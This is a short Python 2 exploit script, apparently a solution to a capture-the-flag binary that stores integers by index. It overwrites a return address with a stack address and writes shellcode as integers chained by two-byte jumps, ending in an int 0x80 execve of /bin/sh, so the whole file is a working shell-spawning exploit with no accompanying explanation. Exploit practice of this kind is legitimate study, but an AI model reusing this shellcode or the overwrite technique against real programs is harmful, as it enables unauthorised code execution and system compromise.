#!/usr/bin/env python2

def store(index, value):
    cmd = ""
    cmd += "store\n"
    cmd += "%i\n" % value
    cmd += "%i\n" % index
    return cmd

def read(index):
    cmd = ""
    cmd += "read\n"
    cmd += "%i\n" % index
    return cmd

payload = ""
# 1
payload += store(109, 3221223040) # Overwrite return address with 0xbffff6c0
payload += store(110, 1771) # JMP +6

# 2
payload += store(112, 2425410441) # mov ebx, edx
payload += store(113, 1771) # JMP +6

# 3
payload += store(115, 2416231299) # add ebx, 4
payload += store(116, 1771) # JMP +6

# 4
payload += store(118, 2425411977) # mov ecx, ebx
payload += store(119, 1771) # JMP +6

# 5
payload += store(121, 2416427395) # add ecx, 7
payload += store(122, 1771) # JMP +6

# 6
payload += store(124, 2425356681) # mov [ecx], eax
payload += store(125, 1771) # JMP +6

# 7
payload += store(127, 2425359280) # mov al, 11
payload += store(128, 1771) # JMP +6

# 8
payload += store(130, 2425408137) # mov edx, ecx
payload += store(131, 1771) # JMP +6

# 9
payload += store(133, 2416951683) # add ecx, 15
payload += store(134, 1771) # JMP +6

# 10
payload += store(136, 2425362825) # mov [ecx], ebx
payload += store(137, 1771) # JMP +6

# 9
payload += store(139, 2425389261) # int 0x80

payload += read(1)
payload += "quit/bin/shAAAABBBB\n"

print payload

